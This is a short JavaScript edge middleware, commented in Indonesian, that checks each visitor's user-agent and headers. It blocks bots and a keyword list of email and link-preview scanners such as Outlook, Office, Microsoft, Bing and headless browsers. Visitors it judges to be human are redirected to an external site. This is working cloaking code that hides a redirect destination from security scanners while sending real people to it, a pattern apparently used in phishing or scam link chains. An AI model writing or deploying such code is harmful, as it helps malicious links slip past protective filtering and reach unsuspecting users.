export default function middleware(req) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  
  // 1. FINGERPRINTING UNIVERSAL (Mobile & Desktop)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  
  // Deteksi Platform: Android, iPhone, atau Desktop modern
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua) && !/bot|crawler|spider/.test(ua);

  // 2. DAFTAR HITAM BOT (Filter Bot Scanner)
  const hardBotKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
    'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud'
  ];

  const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));

  // 3. LOGIKA FILTER (Sangat Akurat)
  // - Blokir jika terdeteksi bot murni
  // - ATAU Jika User-Agent terlalu pendek (Ciri bot mentah)
  // - ATAU Jika tidak punya header bahasa (Bot jarang punya setting bahasa)
  // - ATAU Jika bukan Mobile DAN bukan Desktop (Berarti mesin/script asing)
  if (isHardBot || ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    return new Response('Error 403: Access Denied', { 
      status: 403,
      headers: { 'Content-Type': 'text/plain' }
    });
  }

  // 4. JIKA LOLOS (MANUSIA ASLI - HP MAUPUN PC)
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
        'Refresh': `0; url=${targetUrl}`
      }
    }
  );
}
